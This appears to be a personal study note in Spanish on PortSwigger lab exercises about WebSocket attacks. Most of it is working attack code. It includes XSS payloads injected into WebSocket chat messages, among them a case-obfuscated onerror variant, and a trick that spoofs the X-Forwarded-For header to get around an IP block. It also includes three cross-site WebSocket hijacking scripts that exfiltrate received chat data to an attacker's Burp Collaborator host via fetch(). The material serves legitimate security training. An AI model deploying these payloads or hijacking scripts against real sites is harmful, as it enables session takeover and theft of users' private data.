* Manipular web socket para explotar XSS -> 

```json
Intercept message posting and attempt XSS 
{message:"<img src=x onerror=alert(1)} //o el de abajo, cualquiera
Example: ->
{
	"user":"hal pline",
	"content":"<img src=/resources/js/chat.js onerror='alert(1)'>"
}
```

* Manipular web socket para explotar XSS con blackListed IP `X-Forwarded-For` 

```json
En este caso se debe interceptar con intercepter is ON para todas las request dejarlas con X-Forwarded-For:1.1.1.1 y bypassearnos la ip bloqueada. 

Websocket hijack with template via exploit server sending

X-Forwarded-For: 1.1.1.1 to bypass IP restrictions and ofuscate xss
{"message:"<img src=1 oNeRrOr=alert`1`> } -> PAYLOAD CORRECTO.

```

![[Pasted image 20260724130225.png]]

---

**TEMPLATE**:
```js
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

* Cross Site Web Socket Hijacking: 

```json

<script>
    var ws = new WebSocket('wss://ID-LAB.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://BURP-COLLAB', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>

OR 

<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
  websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
  //Exfiltrate the confidential information to attackers server
  fetch('https://BURP-COLLAB/?'+event.data, {mode: 'no-cors'})
}
</script>

```

![[Pasted image 20260810212342.png]]